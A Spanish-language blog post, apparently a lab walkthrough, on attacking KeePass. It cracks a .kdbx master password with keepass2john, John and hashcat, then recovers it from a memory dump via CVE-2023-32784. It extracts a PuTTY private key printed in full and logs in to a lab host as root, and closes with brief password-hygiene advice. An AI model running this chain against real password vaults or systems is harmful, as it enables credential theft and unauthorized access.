---
date: 2023-09-22T23:15:05.000Z
layout: post
comments: true
title: Keepass Hacking
subtitle: 'Cracking y dumpeo de contraseñas'
description: >-
image: >-
    https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/keepassimg.png
optimized_image: >-
    https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/keepassimg.png
category: ciberseguridad
tags: 
  - hacking
  - keepass
  - keepass2john
  - john
  - hashcat
  - CVE-2023-32784
  - keepassdump
  - dump
  - dmp
  - kdbx
  - putty
  - puttygen
author: Felipe Canales Cayuqueo
paginate: true
---

KeePass es un gestor de contraseñas de código abierto y gratuito. Permite a los usuarios almacenar sus contraseñas en una base de datos cifrada, que puede ser desbloqueada con una única contraseña maestra o una llave de archivo. La idea detrás de un gestor de contraseñas como KeePass es que sólo tienes que recordar una contraseña complicada (la contraseña maestra), y el software se encarga de almacenar y gestionar todas las demás contraseñas para diferentes sitios y aplicaciones.

Como cualquier software, KeePass ha enfrentado vulnerabilidades a lo largo de los años, algunos de los riesgos y vulnerabilidades pueden ser los siguientes:

### Cracking de contraseña

El archivo ```.kdbx``` es el formato de base de datos que utiliza KeePass para almacenar las contraseñas cifradas. El intento de "cracking" (o romper) un archivo .kdbx suele involucrar intentar descifrar el archivo para acceder a su contenido sin conocer la contraseña maestra o la clave de cifrado correcta. Para esto ocuparemos la herramienta ```keepass2john``` para procesar el archivo ```passcodes.kdbx```. Esta herramienta extraerá cierta información del archivo ```.kdbx``` (no las contraseñas almacenadas, sino información relacionada con el cifrado) y la presentará en un formato que John the Ripper pueda entender.

```bash
┌─[root@kali]─[/home/user/keepass]
└──╼ keepass2john passcodes.kdbx > Kepasshash.txt 
passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc             
```

A continuación de consigue descifrar la contraseña con JohnTheRipper:

```bash
┌─[root@kali]─[/home/user/keepass]
└──╼ john --wordlist=test.txt Kepasshash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rødgrød med fløde (passcodes)     
1g 0:00:00:00 DONE (2023-09-17 02:55) 12.50g/s 62.50p/s 62.50c/s 62.50C/s admin..rødgrød med fløde
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
             
```

Para ocupar hashcat debemos borrar la sección que dice "passcodes":

```bash
┌─[root@kali]─[/home/user/keepass]
└──╼ cat Kepasshashcat.txt 
$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc 
```

```bash
┌─[root@kali]─[/home/user/keepass]
└──╼ hashcat -m 13400 Kepasshashcat.txt test.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: test.txt
* Passwords.: 5
* Bytes.....: 66
* Keyspace..: 5
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc:rødgrød med fløde
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae...cdbcdc
Time.Started.....: Sun Sep 17 02:59:33 2023 (1 sec)
Time.Estimated...: Sun Sep 17 02:59:34 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (test.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        7 H/s (0.41ms) @ Accel:32 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5/5 (100.00%)
Rejected.........: 0/5 (0.00%)
Restore.Point....: 0/5 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59392-60000
Candidate.Engine.: Device Generator
Candidates.#1....: admin -> rødgrød med fløde
Hardware.Mon.#1..: Util: 27%

Started: Sun Sep 17 02:58:10 2023
Stopped: Sun Sep 17 02:59:36 2023
        
```

Tal como sucedió con la herramienta ```John```, pudimos descifrar la contraseña.

### Keepass password dumper (CVE-2023-32784)

CVE-2023-32784 permite la recuperación de la contraseña maestra en texto sin formato de un volcado de memoria. El volcado de memoria puede ser un volcado del proceso KeePass, un archivo de intercambio (pagefile.sys), un archivo de hibernación (hiberfil.sys) o un volcado de RAM de todo el sistema. Para ello debemos tener un archivo ```.dmp``` como se puede apreciar a continuación:

```bash
┌─[root@kali]─[/home/user/keepass]
└──╼ ls
KeePassDumpFull.dmp  Kepasshashcat.txt  Kepasshash.txt  passcodes.kdbx         
```

KeePass 2.X utiliza un cuadro de texto desarrollado a medida para ingresar la contraseña, SecureTextBoxEx. El defecto explotado en este CVE es que por cada carácter escrito, se crea una cadena sobrante en la memoria. Debido a cómo funciona .NET, es casi imposible deshacerse de él una vez creado. 

Para explotar esta vulnerabilidad utilizaremos la herramiente [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper) en Windows y también [.NET](https://dotnet.microsoft.com/en-us/download). Una vez tenemos todo instalado ingresaremos al directorio del proyecto en la terminal (Powershell en Windows), finalmente ejecutaremos ```dotnet run PATH_TO_DUMP```.


> Opción desde linux: [keepass-dump-masterkey](https://github.com/CMEPW/keepass-dump-masterkey).


```powershell
PS D:\Ciberseguridad\keepass-password-dumper-main> dotnet run .\KeePassDumpFull.dmp
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●Ï
Found: ●,
Found: ●l
Found: ●`
Found: ●-
Found: ●'
Found: ●]
Found: ●§
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●I
Found: ●:
Found: ●=
Found: ●_
Found: ●c
Found: ●M

Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M,
3.:     d,
4.:     g,
5.:     r,
6.:     ø,
7.:     d,
8.:      ,
9.:     m,
10.:    e,
11.:    d,
12.:     ,
13.:    f,
14.:    l,
15.:    ø,
16.:    d,
17.:    e,
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde        
```

Al terminar el proceso nos entrega como respuesta ```M}dgrød med fløde``` la cual no está siendo del todo precisa y para solucionar este problema buscaremos la palabra en un navegador web:

[![keepass1](/images/keepass1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/keepass1.png)

Como se aprecia es posible detectar correctamente la contraseña e intentaremos ingresar a Keepass pero ocupando solo minúsculas:

[![keepass2](/images/keepass2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/keepass2.png)

[![keepass3](/images/keepass3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/keepass3.png)

Hemos logrado acceder al gestor de contraseñas y, dentro de él, hemos identificado una clave SSH para Putty.

[![keepass5](/images/keepass5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/keepass5.png)

La copiamos en un archivo ```.ppk```:

```bash
┌─[root@kali]─[/home/user/keepass]
└──╼ cat putty.ppk                                                  
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0        
```

Es posible convertir la clave a formato OpenSSH utilizando puttygen desde la línea de comandos:

```bash
┌─[root@kali]─[/home/user/keepass]
└──╼ puttygen putty.ppk -O private-openssh -o id_rsa         
```

Una vez que tengas tu clave en formato ```id_rsa```, no olvides establecer los permisos correctos para el archivo:

```bash
┌─[root@kali]─[/home/user/keepass]
└──╼ chmod 600 id_rsa         
```

Para terminar nos conectamos como el usuario root con el ```id_rsa``` generado:

```bash
┌─[root@kali]─[/home/user/keepass]
└──╼ ssh root@10.10.11.227 -i id_rsa
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# ls
root.txt  RT30000.zip  SQL
root@keeper:~# cat root.txt 
3....f22a3ecdac7..............
         
```

### Recomendaciones

Tu contraseña maestra es el primer y más crítico nivel de defensa. Asegúrate de que sea larga, compleja y única, además de mantener siempre actualizado el gestor de contraseñas pues el equipo detrás de KeePass y la comunidad en general son activos en la identificación y corrección de problemas de seguridad.
